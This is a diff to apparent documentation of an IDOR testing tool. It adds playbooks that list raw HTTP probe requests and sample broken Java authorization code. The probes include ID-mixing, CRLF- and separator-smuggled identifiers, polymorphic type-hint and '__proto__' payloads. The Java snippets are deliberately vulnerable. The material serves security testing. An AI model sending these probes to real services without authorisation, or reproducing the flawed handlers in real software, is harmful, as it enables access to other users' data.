@@ -412,6 +412,81 @@ String effectiveId = request.queryParams("id").get(0);
 return objectService.loadForUser(user, effectiveId);
 ```
 
+### `idor.query.comma_separated_identifiers`
+
+Display name:
+`Comma-Separated Identifiers`
+
+### Purpose
+
+This playbook exists because some APIs accept list-style query parameters such as `id=1,2,3` and then iterate, split, or partially validate them. Mixing authorized and target IDs inside one comma-separated value can expose “any-match” or first-item-only behavior.
+
+### Raw HTTP Examples
+
+Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.
+
+```http
+GET /something/def456?id=def456,abc123 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/def456?id=abc123,def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+### What The Broken Target Code Might Look Like
+
+```java
+String ids = request.queryParam("id");
+for (String id : ids.split(",")) {
+    if (userOwns(user, id)) {
+        return objectService.load(id);
+    }
+}
+
+throw forbidden();
+```
+
+### `idor.query.json_wrap`
+
+Display name:
+`Query JSON Wrap`
+
+### Purpose
+
+This playbook exists because some APIs accept query values that later get parsed as JSON or bound into objects. Wrapping the ID in a small JSON object can push the request into a different parser or binding path.
+
+### Raw HTTP Examples
+
+Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.
+
+```http
+GET /something/def456?user_id={"id":9} HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/def456?user_id={"user_id":9} HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+### What The Broken Target Code Might Look Like
+
+```java
+String raw = request.queryParam("user_id");
+if (raw != null && raw.startsWith("{")) {
+    JsonNode node = objectMapper.readTree(raw);
+    return objectService.load(node.path("id").asText());
+}
+
+return objectService.load(raw);
+```
+
 ### `idor.query.identifier_aliases`
 
 Display name:
@@ -586,6 +661,59 @@ if (request.contentType().contains("application/json")) {
 return objectController.handleFallbackParser(request);
 ```
 
+### `idor.body.json_batch_identifiers`
+
+Display name:
+`JSON Batch Identifiers`
+
+### Purpose
+
+This playbook exists because some APIs accept a single identifier field as an array or batch-style list. Including both the authorized and target IDs in one JSON array can surface “contains any authorized ID” logic or mixed batch-processing bugs.
+
+### Raw HTTP Examples
+
+Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"users":["def456"]}
+```
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"users":["abc123","def456"]}
+```
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"users":["def456","abc123"]}
+```
+
+### What The Broken Target Code Might Look Like
+
+```java
+JsonNode ids = request.json().get("users");
+for (JsonNode id : ids) {
+    if (userOwns(user, id.asText())) {
+        return objectService.loadBatch(ids);
+    }
+}
+
+throw forbidden();
+```
+
 ### `idor.hybrid.accept_negotiation`
 
 Display name:
@@ -676,6 +804,62 @@ if (body.has("accountId") && body.get("accountId").isObject()) {
 }
 
 return objectController.handle(request);
+```
+
+### `idor.body.deserialization_hints`
+
+Display name:
+`Deserialization Hints`
+
+### Purpose
+
+This playbook exists because some servers deserialize untrusted JSON into richer objects than the developer intended. Type-hint fields, prototype-like wrappers, or alternate object shapes can send the target identifier through a different binder, mapper, or polymorphic deserialization path.
+
+### Raw HTTP Examples
+
+Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"user_id":{"@type":"java.lang.String","user_id":"def456"}}
+```
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"user_id":{"@class":"java.lang.String","user_id":"def456"}}
+```
+
+```http
+POST /something/def456 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"user_id":{"__proto__":{"user_id":"def456"}}}
+```
+
+### What The Broken Target Code Might Look Like
+
+```java
+Object supplied = bodyBinder.bind(request.body());
+
+if (supplied instanceof Map<?, ?> object && object.containsKey("@type")) {
+    return polymorphicResolver.resolve(object);
+}
+
+if (supplied instanceof UserReference ref) {
+    return accountService.load(ref.userId());
+}
+
+return accountService.load(String.valueOf(supplied));
 ```
 
 ### `idor.body.json_parameter_pollution`
@@ -864,6 +1048,18 @@ Cookie: session=user-session
 ```
 
 ```http
+GET /something/def456%0d%0aabc123 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/def456;abc123 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
 POST /something HTTP/1.1
 Host: target.example
 Cookie: session=user-session
@@ -879,6 +1075,15 @@ Cookie: session=user-session
 Content-Type: application/json
 
 {"id":"def456%00"}
+```
+
+```http
+POST /something HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"def456|abc123"}
 ```
 
 ### What The Broken Target Code Might Look Like
@@ -940,6 +1145,60 @@ if (effectiveId == null || effectiveId.isBlank() || "undefined".equals(effective
 }
 
 return objectService.load(effectiveId);
+```
+
+### `idor.hybrid.resource_shortcuts`
+
+Display name:
+`Resource Shortcuts`
+
+### Purpose
+
+This playbook exists because some APIs treat semantic identifier shortcuts like `me`, `self`, or `all` as special selectors. Replacing a concrete object ID with those tokens can fall into current-user or collection-wide code paths.
+
+### Raw HTTP Examples
+
+Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.
+
+```http
+GET /something/me HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/all HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/def456?id=/me HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+POST /something HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"/all"}
+```
+
+### What The Broken Target Code Might Look Like
+
+```java
+String suppliedId = request.pathParam("id");
+if ("me".equalsIgnoreCase(suppliedId) || "self".equalsIgnoreCase(suppliedId)) {
+    return objectService.loadForCurrentUser(user);
+}
+if ("all".equalsIgnoreCase(suppliedId)) {
+    return objectService.loadAllVisibleToRoute();
+}
+
+return objectService.loadById(suppliedId);
 ```
 
 ### `idor.hybrid.case_variants`
@@ -1192,7 +1451,7 @@ Display name:
 
 ### Purpose
 
-This playbook exists because the router, validator, authorization layer, and proxy stack do not always decode the identifier in the same way.
+This playbook exists because the router, validator, authorization layer, and proxy stack do not always decode or normalize the identifier in the same way.
 
 ### Raw HTTP Examples
 
@@ -1206,6 +1465,12 @@ Cookie: session=user-session
 
 ```http
 GET /something/%2564%2565%2566%2534%2535%2536 HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+```
+
+```http
+GET /something/550e8400%2De29b%2D41d4%2Da716%2D446655440000 HTTP/1.1
 Host: target.example
 Cookie: session=user-session
 ```
@@ -1231,6 +1496,15 @@ Content-Type: application/json
 {"id":"%64%65%66%34%35%36"}
 ```
 
+```http
+POST /something HTTP/1.1
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"550e8400\u002de29b\u002d41d4\u002da716\u002d446655440000"}
+```
+
 ### What The Broken Target Code Might Look Like
 
 ```java
@@ -1240,6 +1514,8 @@ denyIfForbidden(checkedId);
 String routedId = urlDecode(request.rawPathParam("id"));
 return objectService.load(routedId);
 ```
+
+Null-byte suffixes like `%00` are covered separately by `idor.hybrid.trailing_control_characters`, so this playbook stays focused on encoding and normalization differences rather than control-character handling.
 
 ### `idor.hybrid.method_override`
 
